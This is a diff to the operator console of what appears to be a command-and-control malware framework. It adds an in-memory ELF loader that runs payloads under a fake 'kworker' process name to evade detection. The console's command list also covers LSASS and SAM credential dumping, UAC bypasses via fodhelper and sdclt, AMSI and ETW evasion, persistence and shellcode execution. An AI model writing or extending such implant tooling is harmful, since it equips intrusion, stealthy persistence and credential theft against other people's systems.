@@ -5,6 +5,7 @@ from server import ps_modules
 import re
 import shlex
 import json
+import random
 import subprocess
 from tabulate import tabulate
 from jsonc_parser.parser import JsoncParser
@@ -38,27 +39,27 @@ agent_completer_windows = NestedCompleter.from_nested_dict({
     'software': None,
     'clipboard': None,
     'screenshot': None,
-    'audio': None,
+    'audio ': None,
     'unhook': None,
     'amsi': None,
     'etw': None,
-    'persist': {
-        'run': None,
-        'spe': None
+    'persist ': {
+        'run ': None,
+        'spe ': None
     },
-    'uac': {
-        'fodhelper',
-        'sdclt'
+    'uac ': {
+        'fodhelper ',
+        'sdclt '
     },
-    'lsass': {
+    'lsass ': {
         'direct': None,
         'comsvcs': None
     },
     'sam': None,
-    'shellc': None,
-    'assembly': None,
-    'msgbox': None,
-    'speak': None,
+    'shellc ': None,
+    'assembly ': None,
+    'msgbox ': None,
+    'speak ': None,
     'sleep ': None,
     'collect': None,
     'kill': None,
@@ -72,6 +73,10 @@ agent_completer_linux = NestedCompleter.from_nested_dict({
     'cmd ': None,
     'download ': None,
     'upload ': None,
+    'memfd ': {
+        'implant ': None,
+        'task ': None
+    },
     'sleep ': None,
     'collect': None,
     'kill': None,
@@ -230,7 +235,9 @@ def print_agent_help(os):
     upload <local-file> <remote-path>      ->  upload a file to the agent (wrap paths with quotes)
     
     --== Post Exploitation Stuff ==--
-    memfd <elf-file>                       ->  load elf in-memory using the memfd_create syscall
+    memfd <implant/task> <elf-file>        ->  load elf in-memory using the memfd_create syscall
+                                               implant mode: load the elf as a child process and return
+                                               load the elf as a child process, wait on it, and get its output when it's done
     
     --== Communication Stuff ==--
     sleep <sleep-time> <jitter-%>          ->  change sleep time interval and jitter
@@ -545,6 +552,23 @@ def agent_screen_linux(agent_id):
                     "command_type": "upload",
                     "src_file_data_base64": src_file_data_base64,
                     "dst_file_path": remote_file
+                }
+
+            elif re.fullmatch(r"\s*memfd\s+(implant|task)\s+.+", command):
+                args = re.sub(r"\s*memfd\s+", "", command, 1)
+                mode = shlex.split(args)[0]
+                elf_file = shlex.split(args)[1]
+                elf_file_content = utils.read_file(elf_file)
+                if not elf_file_content:
+                    continue
+                else:
+                    elf_file_data_base64 = utils.encode_base_64(elf_file_content, encoding="utf-8")
+                fake_process_name = f"kworker/[{random.randint(0, 4)}:{random.randint(0, 4)}]"
+                command_dict = {
+                    "command_type": "memfd",
+                    "mode": mode,
+                    "fake_process_name": fake_process_name,
+                    "elf_file_data_base64": elf_file_data_base64
                 }
 
             elif re.fullmatch(r"\s*sleep\s+\d+\s+\d+\s*", command):
